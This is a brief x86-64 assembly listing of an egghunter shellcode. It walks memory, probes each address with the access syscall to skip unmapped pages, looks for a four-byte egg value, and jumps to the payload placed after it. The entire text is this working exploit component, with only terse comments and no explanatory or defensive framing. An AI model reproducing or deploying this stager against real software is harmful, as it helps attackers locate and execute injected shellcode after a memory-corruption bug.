global _start

section .text

_start:

next:

	inc rdx             	; rdx has a address valid in the example
	push 21         
	pop rax             	; syscall access
	push rdx
	pop rdi			; mov rdx to rdi
	syscall             	; syscall
	cmp al, 0xf2        	; checks for EFAULT.
	jz next
	mov eax, 0x50905090 
	inc eax    		; in the egg is 0x50905091
	scasd			; check if we have found the egg 
	jnz next       		; try next byte
	jmp rdi             	; go to the shellcode
